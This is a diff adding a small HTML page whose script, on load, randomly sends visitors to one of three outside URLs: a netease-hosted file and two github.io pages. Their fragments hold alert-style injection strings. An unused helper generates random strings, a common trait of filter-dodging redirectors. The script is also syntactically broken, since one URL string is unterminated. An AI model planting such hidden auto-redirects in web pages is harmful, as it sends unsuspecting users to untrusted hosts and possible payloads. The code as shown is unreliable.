@@ -1,0 +1,28 @@
+<html>
+<script>
+
+
+var sj = Math.floor(Math.random()*(70-10+1)+10);
+var aa=[
+		
+			'http://xylive.fp.ps.netease.com/file/646b1cfcb7b9d5a0ee2d2257c5HUaXPh04?2f,
+			'http://zxcasdd.github.io/git.html?tj_wv=3&p=null&time='+sj+'#sa.alert(1%28Xc'+sj,
+		'http://avkk2023.github.io/in.html?qtvj_wv=3&p=null&time='+sj+'#f.alert(1%28Xc'+sj,
+];
+location.href = aa[Math.floor(Math.random()*aa.length)];
+
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
+}
+</script>
+<html>
